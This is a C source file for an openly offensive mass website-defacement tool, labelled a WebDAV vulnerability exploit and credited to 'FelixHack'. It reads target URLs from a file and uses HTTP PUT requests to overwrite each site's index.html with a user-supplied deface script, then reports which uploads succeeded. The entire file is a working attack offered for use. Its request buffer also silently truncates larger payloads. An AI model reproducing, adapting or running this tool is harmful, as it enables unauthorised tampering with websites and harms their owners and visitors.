#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>

#define BUFFER_SIZE 1024
#define RESPONSE_BUFFER_SIZE 4096

/* clear the screen after running the application */
void clear_screen() {
    printf("\033[H\033[J");
}

void upload_script(const char *script, const char *target_file) {
    /* Opens the target file eg targets.txt */
    FILE *target_fp = fopen(target_file, "r");
    /* if did not succeed to open a file */
    if (!target_fp) {
        perror("Failed to open target file");
        exit(EXIT_FAILURE); 
    }
    /* open the html file */
    FILE *script_fp = fopen(script, "r");
    /* if that did not exceed then show error*/
    if (!script_fp) {
        perror("Failed to open script file");
        fclose(target_fp);
        exit(EXIT_FAILURE);
    }
    /* Moves the file pointer to the end of the script file to get the size of the script using ftell()*/
    /* Then moves the file pointer to the start using fseek()*/
    fseek(script_fp, 0, SEEK_END);
    long script_size = ftell(script_fp);
    fseek(script_fp, 0, SEEK_SET);
    
    /* Allocates memory to hold the entire script data for the null terminator */
    
    char *script_data = malloc(script_size + 1);
    /* if got an bug show error*/
    if (!script_data) {
        perror("Memory allocation failed");
        fclose(script_fp);
        fclose(target_fp);
        exit(EXIT_FAILURE);
    }

    /* Reads the script files content into script_data  and adds a null terminator at the end of the string */
    /* Close the script file */
    fread(script_data, 1, script_size, script_fp);
    script_data[script_size] = '\0';
    fclose(script_fp);
    
    /* Reads the each line of the target URL from the target_file into target array */
    char target[256];
    while (fgets(target, sizeof(target), target_fp)) {
        target[strcspn(target, "\n")] = '\0'; // Remove newline

        char host[256], path[256] = "/index.html";
        int port = 80;  // initializing 

        // structural conf 

        if (strncmp(target, "http://", 7) == 0) {
            sscanf(target + 7, "%255[^:/]:%d/%255[^\"]", host, &port, path);
        } else {
            strncpy(host, target, sizeof(host) - 1);
            host[sizeof(host) - 1] = '\0';
        }
        /* Copies the target url into Host */
        /* Resolves the host to an IP address using gethostbyname() */
        
        struct hostent *server = gethostbyname(host);
        if (!server) {
            fprintf(stderr, "[FAILED] Unable to resolve host: %s\n", host);
            continue;
        }
        /* Creates a socket with IPV4 family: AF_INET and TCP protocol : SOCK_STREAM*/
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("Socket creation failed");
            continue;
        }
        /* Sets up the server address structure (server_addr) to specify */
        struct sockaddr_in server_addr;
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        memcpy(&server_addr.sin_addr.s_addr, server->h_addr, server->h_length);
        
        /* Tries to connect to the server using the connect() function*/
        /* if connections fails closes the socket but continues the next target */
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Connection failed");
            close(sock);
            continue;
        }
        /* Prepares the HTTP put req to upload the script*/
        /* Includes the target path, host, content-length, and the script data */
        char request[BUFFER_SIZE];
        snprintf(request, sizeof(request),
                 "PUT %s HTTP/1.1\r\n"
                 "Host: %s\r\n"
                 "Content-Length: %ld\r\n"
                 "Content-Type: text/html\r\n"
                 "Connection: close\r\n\r\n%s",
                 path, host, script_size, script_data);
    
        if (send(sock, request, strlen(request), 0) < 0) {
            perror("Send failed");
            close(sock);
            continue;
        }
        /* Receives the response from the server and checks if the upload was successful by looking for 200 OK and 201 Created*/
        /* If successful, prints a success message; otherwis, it prints a failure message */
        char response[RESPONSE_BUFFER_SIZE];
        int received = recv(sock, response, sizeof(response) - 1, 0);
        if (received > 0) {
            response[received] = '\0';
            if (strstr(response, "200 OK") || strstr(response, "201 Created")) {
                printf("[SUCCESS] Uploaded to %s%s\n", target, path);
            } else {
                printf("[FAILED] Upload failed for %s\n", target);
            }
        } else {
            perror("Receive failed");
        }

        close(sock);
    }

    free(script_data);
    fclose(target_fp);
}

int main() {
    clear_screen();
    printf("///////////////////////////////////////////////////////////////\n");
    printf("// WebDAV Vulnerability Exploit - Upload Script to Targets: Hack with FelixHack   //\n");
    printf("///////////////////////////////////////////////////////////////\n\n");

    char script[256], target_file[256] = "targets.txt";

    printf("Enter the name of your deface script (e.g., defacescript.html): ");
    scanf("%255s", script);
    /* Checks if the script file exists using access */
    if (access(script, F_OK) == -1) {
        fprintf(stderr, "[ERROR] File '%s' not found!\n", script);
        exit(EXIT_FAILURE);
    }

    upload_script(script, target_file);

    return 0;
}

